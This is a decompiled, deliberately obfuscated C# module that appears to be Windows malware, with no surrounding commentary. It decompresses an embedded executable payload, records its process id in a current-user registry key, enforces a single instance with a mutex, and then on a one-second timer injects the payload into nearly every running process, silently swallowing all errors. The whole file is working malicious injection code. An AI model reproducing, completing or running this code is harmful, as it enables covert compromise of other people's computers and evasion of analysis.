using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Timers;
using InjectionLibrary;
using JLibrary.PortableExecutable;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

[StandardModule]
internal sealed class ________________________________________________________________________________
{
	private unsafe static string m__ = _003CModule_003E.__________(29364, (int)((nint)Type.EmptyTypes.LongLength + 33096), sizeof(int) + 239);

	private static byte[] m___;

	private static string m____ = _003CModule_003E.____<string>(2905375367u);

	private static Mutex m_____;

	private static bool m______ = false;

	public unsafe static void _()
	{
		try
		{
			int _________ = _003CModule_003E.__________;
			if ((-(_________ & 0x3FFFFBA8) ^ 0x1C3C) == 0)
			{
				goto IL_00b3;
			}
			if (!______________________________________________________________.______________________)
			{
				return;
			}
			________________________________________________________________________________.m___ = ___________________________________________________________________._______(__________________________________________________________________________.____, _003CModule_003E.____<string>(606130436u));
			int num = -30446;
			int num2 = default(int);
			if (((uint)(num2 * (25190400 * num2 - (_________ << 7))) ^ 0xBEDu) != 0)
			{
			}
			________________________________________________________________________________.m___ = ______(________________________________________________________________________________.m___);
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(_003CModule_003E.______<string>(4039522827u), writable: true);
			nint num3 = sizeof(float) + -3;
			goto IL_0191;
			IL_00b3:
			registryKey.SetValue(_003CModule_003E._______<string>(3293440499u), RuntimeHelpers.GetObjectValue(___(Process.GetCurrentProcess().Id.ToString())));
			int num4 = ______________________._______;
			num = (int)((((uint)(num4 * 43 + 21 * num4) ^ 0x87CB89E9u) != 0) ? (sizeof(Guid) + 3880) : (((((uint)num4 / 302u) ^ 0xFFFFF47Cu) == 2835) ? ((nint)Type.EmptyTypes.LongLength + -416052288) : 1899178091));
			int __________ = _003CModule_003E.___________;
			num3 = ((__________ + 15452 == __________ * 2 + (int)((uint)__________ % 16u) + __________ * 6) ? ((nint)Type.EmptyTypes.LongLength + 979950861) : ((nint)Type.EmptyTypes.LongLength + 2));
			goto IL_0191;
			IL_0191:
			while (true)
			{
				switch (num3)
				{
				case 3:
					registryKey.SetValue(_003CModule_003E.____<string>(2268715901u), RuntimeHelpers.GetObjectValue(___(______________________________________________________________.__________________)));
					break;
				case 0:
					break;
				default:
					goto IL_016a;
				case 2:
				{
					registryKey.Close();
					________________________________________________________________________________.m____ = Process.GetCurrentProcess().ProcessName.ToString();
					________________________________________________________________________________.m__ = _003CModule_003E.___<string>(2677394803u) + Process.GetCurrentProcess().Id + _003CModule_003E.______<string>(861631917u);
					if (num != 3896)
					{
					}
					do
					{
						Thread.Sleep(1000);
						__();
					}
					while (!________________________________________________________________________________.m______);
					_____();
					System.Timers.Timer timer = new System.Timers.Timer();
					timer.Elapsed += _______;
					timer.Interval = 1000.0;
					timer.Start();
					Thread.Sleep(-1);
					return;
				}
				}
				break;
				IL_016a:
				registryKey.SetValue(_003CModule_003E._____<string>(1556395407u), RuntimeHelpers.GetObjectValue(___(_____________________________________________________________________________.__)));
				num3 = (nint)Type.EmptyTypes.LongLength + 3;
			}
			goto IL_00b3;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void __()
	{
		try
		{
			________________________________________________________________________________.m_____ = new Mutex(initiallyOwned: false, ______________________________________________________________.__________________);
			if (________________________________________________________________________________.m_____.WaitOne(0, exitContext: false))
			{
				________________________________________________________________________________.m______ = true;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static object ___(string string_0)
	{
		return string_0;
	}

	public static void ____(int int_0)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		try
		{
			InjectionMethod val = InjectionMethod.Create((InjectionMethodType)2);
			PortableExecutable val2 = new PortableExecutable(________________________________________________________________________________.m___);
			try
			{
				val.Inject(val2, int_0);
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void _____()
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				Process process = processes[i];
				try
				{
					while (true)
					{
						string text = _003CModule_003E.____<string>(3008796200u);
						int id = process.Id;
						string text2 = text + id + _003CModule_003E.____<string>(3008796200u);
						int num2 = (int)((nint)Type.EmptyTypes.LongLength + 28310);
						switch (((id * 34 + id * 222 << 26) + id - 918359351 == id) ? ((nint)Type.EmptyTypes.LongLength + -1147819050) : ((nint)Type.EmptyTypes.LongLength + 0))
						{
						default:
						{
							if (________________________________________________________________________________.m__.Contains(text2))
							{
								break;
							}
							________________________________________________________________________________.m__ += text2;
							int num3 = num2;
							num2 = -26979;
							if (num3 == 28310)
							{
								_ = Path.GetFullPath(process.MainModule!.FileName) + process.Id;
								int ______________ = _003CModule_003E._______________;
								if ((((uint)(8 * ______________) / 16777216u) ^ 0x22106u) != 0 && num2 == 2882)
								{
									continue;
								}
							}
							if (!process.MainModule!.FileName!.Contains(_003CModule_003E.___<string>(3326195120u)) && !process.MainModule!.FileName!.Contains(_003CModule_003E.___<string>(3003636781u)) && !process.MainModule!.FileName!.Contains(________________________________________________________________________________.m____))
							{
								____(process.Id);
							}
							break;
						}
						}
						break;
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public unsafe static byte[] ______(byte[] byte_0)
	{
		MemoryStream memoryStream = new MemoryStream();
		DeflateStream deflateStream = new DeflateStream(new MemoryStream(byte_0), CompressionMode.Decompress, leaveOpen: true);
		switch (sizeof(short))
		{
		default:
		{
			byte[] array = new byte[4096];
			while (true)
			{
				int num = deflateStream.Read(array, 0, array.Length);
				if (num <= 0)
				{
					break;
				}
				memoryStream.Write(array, 0, num);
			}
			deflateStream.Close();
			return memoryStream.ToArray();
		}
		}
	}

	[SpecialName]
	[DebuggerStepThrough]
	private static void _______(object sender, ElapsedEventArgs e)
	{
		_____();
	}
}
